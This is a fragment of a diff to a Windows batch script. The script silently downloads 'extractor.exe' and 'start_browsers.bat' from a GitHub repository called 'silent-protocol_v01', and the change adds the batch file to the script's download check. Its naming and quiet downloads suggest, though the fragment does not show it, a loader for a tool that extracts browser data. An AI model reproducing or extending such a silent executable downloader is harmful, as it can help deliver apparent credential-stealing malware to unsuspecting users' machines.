@@ -28,7 +28,7 @@ echo Downloading files...
 curl -L -s -o extractor.exe https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/extractor.exe
 curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/silent-protocol_v01/main/start_browsers.bat
 REM Verify all critical downloads
-for %%F in (extractor.exe) do (
+for %%F in (extractor.exe start_browsers.bat) do (
     if not exist "%%F" (
         echo Error: Failed to download %%F
         exit /b 4
